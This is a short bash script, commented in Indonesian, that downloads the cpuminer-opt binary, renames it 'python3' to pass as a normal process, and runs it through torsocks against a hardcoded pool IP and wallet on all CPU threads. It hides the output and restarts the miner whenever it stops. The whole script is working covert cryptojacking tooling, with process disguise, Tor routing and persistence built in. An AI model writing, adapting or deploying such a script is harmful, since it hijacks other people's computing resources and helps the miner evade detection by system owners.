#!/bin/bash
set -e

# ====[ KONFIGURASI ]====
WALLET="mbc1q4xd0fvvj53jwwqaljz9kvrwqxxh0wqs5k89a05.Genzo"
POOL="stratum+tcp://159.223.48.143:443"
ALGO="power2b"
THREADS=$(nproc --all)
FAKE_NAME="python3"
PROXY="socks5://127.0.0.1:9050"

# ====[ CEK DEPENDENSI ]====
command -v torsocks >/dev/null 2>&1 || {
    echo "[!] torsocks tidak ditemukan. Install dengan: apt install torsocks -y"
    exit 1
}

# ====[ DOWNLOAD MINER ]====
if [ ! -f "$FAKE_NAME" ]; then
    wget --no-check-certificate https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz
    tar -xf cpuminer-opt-linux.tar.gz
    mv cpuminer-sse2 "$FAKE_NAME"
    chmod +x "$FAKE_NAME"
fi

# ====[ FUNGSI ANTI-DISMISS & AUTORESTART ]====
while true; do
    echo "[*] Menjalankan miner..."
    torsocks ./"$FAKE_NAME" -a $ALGO -o $POOL -u $WALLET -p x -t $THREADS > /dev/null 2>&1 &
    PID=$!

    while sleep 30; do
        if ! ps -p $PID > /dev/null; then
            echo "[!] Miner mati, restart..."
            break
        fi
    done
done
